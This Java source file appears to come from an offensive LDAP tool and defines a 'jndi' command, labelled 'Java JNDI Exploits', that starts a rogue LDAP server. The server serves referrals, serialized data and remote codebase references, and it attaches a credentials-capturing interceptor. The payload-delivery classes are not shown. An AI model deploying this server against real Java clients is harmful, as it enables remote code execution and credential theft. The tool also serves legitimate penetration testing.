package gs.sy.m8.ldapswak;

import java.io.Closeable;
import java.net.URL;
import java.nio.file.Path;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;

import picocli.CommandLine.Command;
import picocli.CommandLine.Option;

@Command(name = "jndi", description = "Java JNDI Exploits")
public class JNDIServer extends BaseCommand implements CommandRunnable, Closeable {

	private static final Logger log = LoggerFactory.getLogger(JNDIServer.class);
	
	@Option(names = { "--referral" }, description = { "Referral to send" })
	String referral;
	
	@Option(names = { "--serialized" }, description = { "Serialized data to supply" })
	Path serialized;
	
	
	@Option(names = { "--ref-codebase" }, description = { "Reference Codebase URL" })
	URL refCodebase;
	
	@Option(names = { "--ref-class" }, description = { "Reference Class" })
	String refClass;
	
	@Option(names = { "--ref-address"}, description = { "Reference address"})
	String refAddress[];
	
	@Option(names = { "--ref-factory"}, description = { "Reference factory class"})
	String refFactory;

	private InMemoryDirectoryServer listener;

	
	
	@Override
	public void run() throws Exception {
		InMemoryDirectoryServerConfig ldapcfg = createConfig();
		ldapcfg.addInMemoryOperationInterceptor(new JNDIOperationInterceptor(this));
		ldapcfg.addInMemoryOperationInterceptor(new CredentialsOperationInterceptor(this));

		InMemoryDirectoryServer ds = new InMemoryDirectoryServer(ldapcfg);

		log.info("Starting {} listener on {}:{}", ssl ? "SSL" : (nostarttls ? "plain" : "StartTLS"),
				bind != null ? bind.getHostAddress() : "*", port);

		ds.startListening();
		this.listener = ds;
	}

	
	public void close() {
		if ( this.listener != null ) {
			this.listener.shutDown(true);
		}
	}
	
	
}
